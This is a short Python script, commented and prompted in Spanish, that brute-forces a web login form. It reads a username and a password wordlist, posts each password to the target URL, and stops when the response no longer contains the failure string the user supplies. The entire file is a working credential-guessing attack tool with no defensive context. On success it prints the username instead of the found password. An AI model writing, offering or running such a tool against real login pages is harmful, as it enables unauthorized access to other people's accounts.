import requests

url = input('[+] Introduce la URL de la pagina de login: ')
usuario = input("Introduce el nombre de usuario: ")
diccionario = input("Introduce el diccionario de passwords a usar: ")
failcode = input("Introduce el codigo de error que te da al logearte sin exito ")

def fuerzabruta(url,usuario):
    for clave in claves:
        clave = clave.strip()
        print('Probando la password: ' + clave)
        data = {'username':usuario,'password':clave,'Login':'submit'}
        respuesta = requests.post(url, data=data)
        if failcode in respuesta.content.decode():
            pass
        else:
            print('Password Encontrada => ' + usuario  )
            exit()
with open(diccionario, 'r') as claves:
    fuerzabruta(url,usuario)

print('Password no esta en el diccionario')